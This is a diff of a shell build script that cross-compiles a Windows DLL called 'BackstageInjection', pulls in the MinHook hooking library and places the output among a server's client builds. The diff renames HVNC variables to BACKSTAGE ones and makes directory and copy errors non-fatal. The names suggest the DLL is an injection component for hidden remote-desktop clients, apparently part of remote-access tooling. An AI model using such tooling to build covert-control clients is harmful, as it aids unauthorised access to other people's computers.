@@ -24,15 +24,15 @@ ROOT="$(cd -- "$SCRIPT_DIR/.." && pwd)"
 cd "$ROOT"
 
 CC="${CC:-x86_64-w64-mingw32-gcc}"
-SRC_DIR="${HVNC_SRC_DIR:-BackstageInjection/src}"
-OUT_DIR="${HVNC_OUT_DIR:-Overlord-Server/dist-clients}"
+SRC_DIR="${BACKSTAGE_SRC_DIR:-BackstageInjection/src}"
+OUT_DIR="${BACKSTAGE_OUT_DIR:-Overlord-Server/dist-clients}"
 DLL_NAME="BackstageInjection.x64.dll"
 MINHOOK_REPO="${MINHOOK_REPO:-https://github.com/TsudaKageyu/minhook.git}"
 MINHOOK_REF="${MINHOOK_REF:-master}"
-HVNC_FETCH_MINHOOK="${HVNC_FETCH_MINHOOK:-1}"
+BACKSTAGE_FETCH_MINHOOK="${BACKSTAGE_FETCH_MINHOOK:-1}"
 MINHOOK_STATIC_DIR="${MINHOOK_STATIC_DIR:-BackstageInjection/Minhook}"
 
-mkdir -p "$OUT_DIR"
+mkdir -p "$OUT_DIR" 2>/dev/null || true
 
 MINHOOK_DIR="$SRC_DIR/minhook"
 
@@ -40,7 +40,7 @@ stage_minhook_tree() {
   local source_root="$1"
   local include_root="${2:-$1}"
 
-  mkdir -p "$MINHOOK_DIR/hde"
+  mkdir -p "$MINHOOK_DIR/hde" || true
   cp -f "$source_root/buffer.c" "$MINHOOK_DIR/" 2>/dev/null || true
   cp -f "$source_root/buffer.h" "$MINHOOK_DIR/" 2>/dev/null || true
   cp -f "$source_root/hook.c" "$MINHOOK_DIR/" 2>/dev/null || true
@@ -54,7 +54,7 @@ stage_minhook_tree() {
   cp -f "$source_root/hde/table64.h" "$MINHOOK_DIR/hde/" 2>/dev/null || true
   cp -f "$source_root/hde/table32.h" "$MINHOOK_DIR/hde/" 2>/dev/null || true
 
-  mkdir -p "$SRC_DIR/include"
+  mkdir -p "$SRC_DIR/include" || true
   if [ -f "$source_root/MinHook.h" ]; then
     cp -f "$source_root/MinHook.h" "$MINHOOK_DIR/MinHook.h" 2>/dev/null || true
     cp -f "$source_root/MinHook.h" "$SRC_DIR/include/MinHook.h" 2>/dev/null || true
@@ -102,7 +102,7 @@ if ! command -v "$CC" >/dev/null 2>&1; then
 fi
 
 fetch_minhook() {
-  if [ "$HVNC_FETCH_MINHOOK" != "1" ]; then
+  if [ "$BACKSTAGE_FETCH_MINHOOK" != "1" ]; then
     return 1
   fi
 
@@ -123,7 +123,7 @@ fetch_minhook() {
 
   stage_minhook_tree "$tmpdir/minhook/src" "$tmpdir/minhook/include"
   cp -f "$tmpdir/minhook/include/MinHook.h" "$MINHOOK_DIR/MinHook.h" 2>/dev/null || true
-  mkdir -p "$SRC_DIR/include"
+  mkdir -p "$SRC_DIR/include" || true
   cp -f "$tmpdir/minhook/include/MinHook.h" "$SRC_DIR/include/MinHook.h" 2>/dev/null || true
   rm -rf "$tmpdir"
 
@@ -155,11 +155,11 @@ if [ -d "$MINHOOK_DIR" ] && { [ -f "$MINHOOK_DIR/hook.c" ] || [ -f "$MINHOOK_DIR
   MINHOOK_INC="-I$MINHOOK_DIR -I$MINHOOK_DIR/hde"
 
   if [ -f "$MINHOOK_DIR/hook.c" ] && [ ! -f "$SRC_DIR/include/MinHook.h" ]; then
-    mkdir -p "$SRC_DIR/include"
+    mkdir -p "$SRC_DIR/include" || true
     if [ -f "$MINHOOK_DIR/MinHook.h" ]; then
-      cp -f "$MINHOOK_DIR/MinHook.h" "$SRC_DIR/include/MinHook.h"
+      cp -f "$MINHOOK_DIR/MinHook.h" "$SRC_DIR/include/MinHook.h" || true
     elif [ -f "$MINHOOK_DIR/include/MinHook.h" ]; then
-      cp -f "$MINHOOK_DIR/include/MinHook.h" "$SRC_DIR/include/MinHook.h"
+      cp -f "$MINHOOK_DIR/include/MinHook.h" "$SRC_DIR/include/MinHook.h" || true
     fi
   fi
 
